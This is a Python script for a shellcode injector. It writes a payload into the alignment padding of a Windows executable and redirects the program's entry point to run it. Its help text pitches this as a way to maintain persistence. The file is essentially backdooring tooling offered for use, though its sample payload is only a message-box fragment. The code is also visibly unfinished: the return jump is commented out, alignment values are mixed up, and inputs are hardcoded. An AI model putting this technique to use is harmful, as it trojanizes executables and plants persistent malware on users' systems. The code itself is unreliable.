import struct
from pefile import PE
from struct import pack
from sys import argv, executable, exit
from optparse import OptionParser
import os

# note, shellcode used should clean up after itself so pusha/popa instructions can be used to
# restore register values to their original state, no stack smashing!
# msfpayload message box - 260 bytes
sample_shellcode = "90,6a,00,90,6a,00,90,6a,00,90,6a,00,90,e8,41,00,00,00,90"

def fixShellcode(sc, jmp_distance):
    ''' Add a pusha / popa instruction to the beggining and end of the shellcode, respectively. 
        Then add a jmp instruction to jump jmp_distance at the end. jmp_distance is a relative distance. '''

    # \x60 = pusha, \x61 = popa, \xe9 = 32 bit relative distance
    new_sc = '\x60%s\x61\xe9%s' % (sc, pack('I', jmp_distance & 0xffffffff))
    return new_sc


def insertShellcode(data, offset, sc):

    # convert to list, replace shellcode, convert back to string
    new_data = list(data)
    sc = sc.split(sep=",")
    _sc = []
    for byte in sc:
        dec_byte = int(byte,16)
        #b = (int(dec_byte)).to_bytes(1, byteorder='big')
        _sc.append(dec_byte)
    new_data[offset:offset+len(_sc)] = _sc
    _new_data = [str(int) for int in new_data]
    _new_data = ",".join(_new_data)
    #new_data = ' '.join(new_data)
    #new_data = ','.join(byte(v) for v in new_data)
    return _new_data


def changeEntryPoint(pe, new_addr):
    ''' change the entry point to the desired location '''
    pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_addr


def getSectionPermissions(section):
    ''' return a dictionary with the permissions of a given section '''

    IMAGE_SCN_MEM_EXECUTE = 0x20000000 # The section can be executed as code.
    IMAGE_SCN_MEM_READ    = 0x40000000 # The section can be read.
    IMAGE_SCN_MEM_WRITE   = 0x80000000 # The section can be written to.

    r,w,x = False, False, False
    characteristics = section.Characteristics

    if characteristics & IMAGE_SCN_MEM_EXECUTE:
        x = True
    if characteristics & IMAGE_SCN_MEM_READ:
        r = True
    if characteristics & IMAGE_SCN_MEM_WRITE:
        w = True
    
    return {'read':r, 'write':w, 'exec':x}

def getEPDetails(pe):
    ''' Return the offset of the end of the raw data on disk for the section containing the PE's entry point, the
        offset at the end of the same section with any padding up to the file alignment, length of any padding, and the permission of the section. '''
    # values we'll need
    section = pe.get_section_by_rva(pe.OPTIONAL_HEADER.AddressOfEntryPoint)
    file_alignment = pe.OPTIONAL_HEADER.SectionAlignment

    # get entry offset directly
    entry_offset = pe.get_offset_from_rva(pe.OPTIONAL_HEADER.AddressOfEntryPoint)

    # how much space is left
    remaining = (section.VirtualAddress + section.Misc_VirtualSize) - pe.OPTIONAL_HEADER.AddressOfEntryPoint
    end_rva = pe.OPTIONAL_HEADER.AddressOfEntryPoint + remaining

    # must be aligned with section
    padding = file_alignment - (end_rva % file_alignment)
    end_offset = pe.get_offset_from_rva(end_rva)
    end_offset_aligned = pe.get_offset_from_rva(end_rva+padding) - 1 # if the rva is calculated from the offset later, we don't want
    # the beginning of the next section aligned address, but the end of this file aligned section... just accept it lol

    permissions = getSectionPermissions(section)
    return (end_offset, end_offset_aligned, padding, permissions)

def injectPE(filename, shellcode, output_file):
    pe = PE(filename)
    original_entry_point = pe.OPTIONAL_HEADER.AddressOfEntryPoint
    (end_offset, end_offset_aligned, padding, permissions) = getEPDetails(pe)

    # check permissions
    print ('[*] Permissions for entry point\'s section :', permissions.items())
    if permissions['exec'] == False:
        print ('[!] Entry point is not executable! Wtf? Exiting!')
        exit(1)

    # check for enough padding to fit the payload
    print ('[*] Found %d bytes of padding' % padding)
    sc_size = len(shellcode)+7 # +1 pusha, +1 popa, +5 rel32 jmp

    if padding < sc_size:
        print ('[!] Not enough padding to insert shellcode :(')
        exit(1)
    else:
        print ('  [+] There is enough room for the shellcode!')
        print ('  [+] start_va = 0x%08x, end_va = 0x%08x' % (pe.OPTIONAL_HEADER.ImageBase+pe.get_rva_from_offset(end_offset), pe.OPTIONAL_HEADER.ImageBase+pe.get_rva_from_offset(end_offset_aligned)))
        print ('  [+] start_offset = 0x%x, end_offset = 0x%x' % (end_offset, end_offset_aligned))

    # use the right-most bytes available
    sc_end_offset = end_offset_aligned
    sc_start_offset = sc_end_offset - sc_size
    print ('[*] Placing the payload at :')
    print ('  [+] start_va = 0x%08x, end_va = 0x%08x' % (pe.OPTIONAL_HEADER.ImageBase+pe.get_rva_from_offset(sc_start_offset), pe.OPTIONAL_HEADER.ImageBase+pe.get_rva_from_offset(sc_end_offset)))
    print ('  [+] start_offset = 0x%x, end_offset = 0x%x' % (sc_start_offset, sc_end_offset))

    # change the entry point
    changeEntryPoint(pe, pe.get_rva_from_offset(sc_start_offset))
    raw_data = pe.write()
    jmp_distance = original_entry_point - pe.get_rva_from_offset(sc_end_offset)

    # fix the shellcode to save register contents and jmp to original entry after completion
    #shellcode = fixShellcode(shellcode, jmp_distance)
    raw_data = insertShellcode(raw_data, sc_start_offset, shellcode)
    pe.close() # close the 'opened' PE first
    raw_data = raw_data.split(sep=",")
    byte_data = []
    new_file = open(output_file, 'ab')
    for number in raw_data:
        byte = struct.pack("B",int(number))
        #number = int(number,16)
        #byte = hex(int(number))
        #byte = byte[2:]
        #byte = bytes(number)

        #byte_data.append(byte)
        new_file.write(byte)

    # write the new file
    new_file.close()
    print ('[*] New file created :)')

def parseCommandLine(argv):
    ''' Parse command line options. Fill in correct values where defaults are used. '''

    # must overwrite the format_epilog function to get our examples printed correctly
    class MyParser(OptionParser):
        def format_epilog(self, formatter):
            return self.epilog

    examples  = "\nExamples:\n"
    examples += 'python pe-injector C:\\...\\program.exe\n'
    examples += 'python pe-injector -s C:\\...\\my_shellcode.bin C:\\...\\program.exe\n'
    examples += 'python pe-injector -s C:\\...\\my_shellcode.bin -o C:\\...\\program2.exe C:\\...\\program.exe\n'

    parser = MyParser(epilog=examples)
    parser.set_description('Inject shellcode into extra file alignment padding of a PE and change the entry point to point to the shellcode. On execution, the shellcode will be executed, then return control flow to the original entry point of the program. Perhaps a nice way to maintain persistence? Check out the README for full details.')
    parser.add_option('-s', action='store', dest='shellcode_file', help='File with desired shellcode. Default is msfpayload x86 message box', metavar='shellcode')
    parser.add_option('-o', action='store', dest='output_file', help='Output file. Default is to overwrite the target executable', metavar='out_file')
    options, args = parser.parse_args(argv)

    # a target executable must be specified
    if len(args) < 2:
        parser.print_help()
        exit(1)

    # if no shellcode file is specified, use the sample shellcode
    if not options.shellcode_file:
        shellcode = sample_shellcode
    else:
        shellcode = open(options.shellcode_file, 'rb').read()
    
    # if no new executable is specified, we overwrite the existing one
    if not options.output_file:
        options.output_file = args[-1]

    return (args[-1], shellcode, options.output_file)


if __name__ == '__main__':

    #(executable, shellcode, output_file) = parseCommandLine(argv)
    executable = 'test.exe'
    shellcode = sample_shellcode
    output_file = 'OSexev2.exe'
    if os.path.isfile(output_file):
        os.remove(output_file)
    print ('[*] PE-Injector invoked with arguments :')
    print ('  [+] Target executable :', executable)
    print ('  [+] Output File       :', output_file)
    print ('  [+] Shellcode         :', repr(shellcode), '\n')
    injectPE(executable, shellcode, output_file)